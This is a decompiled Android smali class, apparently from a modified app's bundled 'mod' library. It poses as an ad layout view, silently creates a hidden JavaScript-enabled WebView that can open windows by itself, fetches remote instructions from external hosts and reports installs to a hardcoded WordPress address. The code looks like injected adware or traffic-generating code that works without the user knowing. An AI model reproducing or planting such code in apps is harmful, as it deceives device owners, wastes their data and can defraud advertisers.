.class public Lcom/mod/libs/TAd;
.super Lcom/mod/libs/TLinearLayout;
.source "TAd.java"

# interfaces
.implements Lcom/mod/libs/TThread$OnThreadEvent;


# static fields
.field public static DAUHost:Ljava/lang/String;


# instance fields
.field private TR:Lcom/mod/libs/TTR;

.field private Thread:Lcom/mod/libs/TThread;

.field private context:Landroid/content/Context;

.field private webViewTrfx:Landroid/webkit/WebView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "https://tranggaken.wordpress.com/mocx1/"

    sput-object v0, Lcom/mod/libs/TAd;->DAUHost:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/util/AttributeSet;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/mod/libs/TLinearLayout;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V

    iput-object p1, p0, Lcom/mod/libs/TAd;->context:Landroid/content/Context;

    invoke-virtual {p0}, Lcom/mod/libs/TAd;->InitAds()V

    return-void
.end method

.method static synthetic access$0(Lcom/mod/libs/TAd;)Lcom/mod/libs/TTR;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TAd;->TR:Lcom/mod/libs/TTR;

    return-object v0
.end method

.method static synthetic access$1(Lcom/mod/libs/TAd;)Landroid/webkit/WebView;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    return-object v0
.end method


# virtual methods
.method public CreateWebViewMocx()V
    .locals 0
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    return-void
.end method

.method public CreateWebViewTrfx()V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    const/4 v2, 0x1

    new-instance v0, Landroid/webkit/WebView;

    iget-object v1, p0, Lcom/mod/libs/TAd;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    iget-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->clearCache(Z)V

    iget-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->clearHistory()V

    iget-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    iget-object v0, p0, Lcom/mod/libs/TAd;->webViewTrfx:Landroid/webkit/WebView;

    new-instance v1, Lcom/mod/libs/TAd$1;

    invoke-direct {v1, p0}, Lcom/mod/libs/TAd$1;-><init>(Lcom/mod/libs/TAd;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    return-void
.end method

.method public InitAds()V
    .locals 2

    invoke-virtual {p0}, Lcom/mod/libs/TAd;->isInEditMode()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/mod/libs/TAd;->CreateWebViewTrfx()V

    invoke-virtual {p0}, Lcom/mod/libs/TAd;->CreateWebViewMocx()V

    new-instance v0, Lcom/mod/libs/TTR;

    iget-object v1, p0, Lcom/mod/libs/TAd;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/mod/libs/TTR;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/mod/libs/TAd;->TR:Lcom/mod/libs/TTR;

    new-instance v0, Lcom/mod/libs/TThread;

    invoke-direct {v0, p0}, Lcom/mod/libs/TThread;-><init>(Lcom/mod/libs/TThread$OnThreadEvent;)V

    iput-object v0, p0, Lcom/mod/libs/TAd;->Thread:Lcom/mod/libs/TThread;

    iget-object v0, p0, Lcom/mod/libs/TAd;->Thread:Lcom/mod/libs/TThread;

    const-string v1, "GetLpx"

    invoke-virtual {v0, v1}, Lcom/mod/libs/TThread;->DoThread(Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public onThread(Ljava/lang/String;)V
    .locals 5

    const-string v3, "GetLpx"

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    :try_start_0
    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v4, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v4, Lcom/mod/libs/TTR$x;->folder_Exc0:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v4, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v4, Lcom/mod/libs/TTR$x;->folder_sts:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/mod/libs/THttp;->ReadRaw(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v4, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v4, Lcom/mod/libs/TTR$x;->folder_desk:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/mod/libs/THttp;->ReadRaw(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v3, p0, Lcom/mod/libs/TAd;->context:Landroid/content/Context;

    check-cast v3, Landroid/app/Activity;

    new-instance v4, Lcom/mod/libs/TAd$2;

    invoke-direct {v4, p0, v2, v0, v1}, Lcom/mod/libs/TAd$2;-><init>(Lcom/mod/libs/TAd;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    iget-object v3, p0, Lcom/mod/libs/TAd;->Thread:Lcom/mod/libs/TThread;

    const-string v4, "InsDAU"

    invoke-virtual {v3, v4}, Lcom/mod/libs/TThread;->DoThread(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    const-string v3, "InsDAU"

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    return-void

    :catch_0
    move-exception v3

    goto :goto_0
.end method
